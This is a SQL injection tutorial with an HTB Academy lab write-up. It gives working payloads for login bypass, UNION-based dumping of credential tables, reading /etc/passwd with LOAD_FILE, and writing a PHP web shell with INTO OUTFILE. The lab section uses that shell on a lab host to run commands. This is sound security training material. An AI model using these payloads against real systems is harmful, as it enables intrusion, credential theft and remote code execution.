# SQL injections

Most modern application use database in their backend to store data. In these applications, the users input some data and in the end this data is used to build SQL queries that are executed in the database.

If the queries are not properly protected, the user might abuse of them to perform any kind of database operation. This is called `SQL Injection`. The term `SQL` refers to relational databases.

Typically the database queries are executed this way:

```php
# A connection is establish using username/password and a database.
$conn = new mysqli("localhost", "root", "password", "users");
# A query is defined
$query = "select * from logins";
# The query is executed and the result is retrieved
$result = $conn->query($query);
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```

Usually user input is introduced in the SQL queries, e.g:

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

If this is not properly secured, a user can craft a malicious payload that allow the attacker to execute anything in the database. In this example, when the user inputs `admin` the query becomes:

```sql
select * from logins where username like '%admin';
```

The problem comes with a payload like: `1'; DROP TABLE users;`. In this case, the SQL query will be:

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

And the user is able to delete the `users` table.

## Types of SQL injections

- In-band: The output of the query is printed directly in the frontend and we can read it.

We can have `Union` based SQL injections which we can pass the column to read and `Error` based where we leverage PHP or SQL errors to reveal the output of the query.

- Blind: In this case, we cannot see the output of the query.

We can use `Boolean` logic in SQL or `Time` based queries, where the query is intentionally delayed using `sleep` under certain conditions.

- Out-of-band: Sometimes, we don't have any access to the query output. In this case, we can forward the query results to an external system, e.g. DNS server.

## Enumerating for SQL injections

First of all, we need to know if the input is vulnerable to SQLi. A good way to check this is to inject characters closely related to SQL in our input:

```
'	-> %27
"	-> %22
#	-> %23
;	-> %3B
)	-> %29
```

Sometimes, we might need to use the url-encoded value of the character.

When we add this characters, we need to be observant to watch for any error or any other change in the application.

## Subverting query logic

Let's image this SQL query:

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

If we introduce a `'` char:

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

We will see a Syntax error in the frontend and now we know this form is vulnerable to SQL injection.

### OR injection

This simple query can be manipulated with the following payload:

`admin' or '1'='1` which will result in the following query:

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

The logic of the query is changed, now it selects the username `admin` or the password `something` AND `true`, which will return False because we don't know the actual password.

`username='admin'` will evaluate to true when there's a username named `admin`.
`1'='1' AND password = 'something'` the first part will evaluate to true always, the second part only when the password is the correct one; since we don't know it, it will evalute to false. True AND False will evaluate to False.

The `OR` operator will evaluate to true when one of the two components is true, so we'll completely bypass the authentication mechanism.

If we don't know the username, we can abuse in the same way of the password field:

```sql
SELECT * FROM logins WHERE username='notAdmin' or '1'='1' AND password = 'something' or '1'='1';
```

### Using comments

Just like any other language, SQL allows the use of comments as well. We can use `#` or `--` to include comments.

```sql
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```

If you introduce comments into the username, it will disable the part of the query that checks the password:

Setting username to `admin'-- ` will create the following query:

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

And we'll have an auth bypass. Sometimes SQL queries use parenthesis which might need to be taken into account when generating the payload, for example:

```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password == "e7df7cd2ca07f4f1ab415d457a6e1c13"
```

If we input username as `admin')--` we will disable the password part and close the parenthesis correctly:

```sql
SELECT * FROM logins WHERE (username='admin')-- AND id > 1) AND password == "e7df7cd2ca07f4f1ab415d457a6e1c13"
```

and we'll have another auth bypass.

### Union

The `union` statement can be use to combine the fields coming from two separate selects. For example:

```sql
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
```

and

```
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)
```

We can use `union` to combine both selects:

```sql
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

The number of columns and data types of the combine data tables should be the same. For example:

```sql
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

When the number of columns doesn't fit, you can just use a number to fill the missing columns.

We can use `UNION` as another source of injections. For example in the query:

```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

We can enter the following payload:

`1' UNION SELECT username, password from passwords-- `

which will end up in the following query:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
and will reveal usernames and passwords.

If the number of columns are not the same, use the previous trick to make the query work:

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```

```sql
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

As seen in this example, we might need to know exactly the numbers of columns of a table. In order to do so, we can use `ORDER BY` statement:

`' order by 1-- -`, we can keep up incrementing the number until the query fails to execute, then we found the number of columns.

We can use `UNION` itself to detect the number of columns, e.g:

`cn' UNION select 1,2,3-- -`. We add numbers until it works.

We also need to know which columns are printed into the application. We can inject junk data and see how it gets printed in the frontend, for example:

`cn' UNION select 1,@@version,3,4-- -`.

This way, we have found where we need to put our injection.

Once we have the SQL injection working, we can run some interesting queries:

```sql
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```
This finds all the available database in the server. 

We can find the current database with `SELECT database()`.

We can use information schema database and tables table to retrieve a list of all the available tables:

`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`

Here, we're using UNION SQL injection to dump all the tables available for the database `dev`.

A similar thing can be done to retrieve the columns of certain table:

`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`

This will list the columns of the table named `credentials`.

Now we can dump the data in the credentials table:

`cn' UNION select 1, username, password, 4 from dev.credentials-- -`

Note the dot operator: the application is using another database than `dev`. The dot operator is need to access other than the configured database.

## Reading files

Under certain conditions databases might be able to read files.

The users have certain privileges configured, so first we need to gather which privileges the application user has.

First, we need to know what user is the application using to deal with the data:

`cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -`

Now we can determine the privileges of the user:

`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`

`cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`

If `FILE` privilege is granted, we can read files. Reading files cannot be simpler (if everything is setup correctly):

`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`

This will dump the contents of `/etc/passwd`. We can dump the source code of the current php script as well:

`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`. The problem is that the code is rendered, however, we can check the HTML source of the page and we'll see the PHP code.

## Writing files

Writing files require more privileges and more configuration:

1. `FILE` privilege enabled.
2. MySQL global secure_file_priv variable not enabled
3. Write access to the location we want to write to on the back-end server

We can check the `secure_file_priv` variable using the SQLi:

`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`

If the result of the variable is empty, it means that we can read/write to any location.

To write to file, we can use `SELECT * INTO OUTFILE <filename>`. For example:

`cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`

This will write the sentence `file written successfully!` into the file `/var/www/html/proof.txt`, which later we can download using the web server. Now that we can write files, we can even write a web shell:

`cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`

And get RCE when visiting the `shell.php` page.

## Skills assessment

This is the write-up for the assessment of HTB academy [SQL injections](https://academy.hackthebox.com/module/33) module.

### Login page

First of all we're given a login page, most likely we'll need to provide a SQLi to bypass the login.

Let's evaluate which fields are vulnerable to SQLi by providing a dangling character, e.g: `'` to break the query.

```bash
curl -vvv 'http://83.136.251.235:30056/' -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=\'&password=1234'
```

We couldn't break any field with the escape characters. We can try some of the pre-defined SQL injections from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-default-databases.

The second one worked fine:

```sql
' OR 1 -- -
```

and we're presented a dashboard with a search box.

### Search box

The search box make a request like:

```bash
curl 'http://83.136.251.235:30056/dashboard/dashboard.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=t7addrm0eidu7ag6m1e7e31geo' --data-raw 'search=a'
```

Looks like the search only works to search the values in the date.

We should follow the same approach: let's try to break the search with escape character: `'` and it worked, we can see an error.

Let's try to determine the number of columns:

```sql
a' UNION SELECT 1,2,3,4 -- -
```
It shows: ` The used SELECT statements have a different number of columns`

It worked with:

```sql
a' UNION SELECT 1,2,3,4,5 -- -
```
But the first column is not shown

The objective is to install a web-shell, so let's enumerate if we're capable of.

```sql
a' UNION SELECT 1,user(),3,4,5 -- -
```
and we got `root@localhost`

Let's check privileges:

```sql
a' UNION SELECT 1,grantee, privilege_type,4,5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'" -- -
```

`FILE` privilege is there.


Check for write file global var:

```sql
a' UNION SELECT 1,variable_name, variable_value,4,5 FROM information_schema.global_variables where variable_name="secure_file_priv" -- -
```

The variable is not set, so we can write.

Let's try it:

```sql
a' UNION SELECT 1,'file written successfully!',3,4,5 into outfile '/var/www/html/dashboard/proof.txt' -- -
```

Now let's try to read it, before we try to install the shell.

```sql
a' UNION SELECT 1,LOAD_FILE('/var/www/html/dashboard/proof.txt'),3,4,5 -- -
```

We got the contents back, so let's install the shell.

```sql
a' UNION select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/1.php' -- -
```

And we've got the shell `http://83.136.251.235:30056/dashboard/1.php?0=id`

Now we list files at root: `http://83.136.251.235:30056/dashboard/1.php?0=ls%20/`

Now we can retrieve the flag: `http://83.136.251.235:30056/dashboard/1.php?0=cat%20/flag_cae1dadcd174.txt`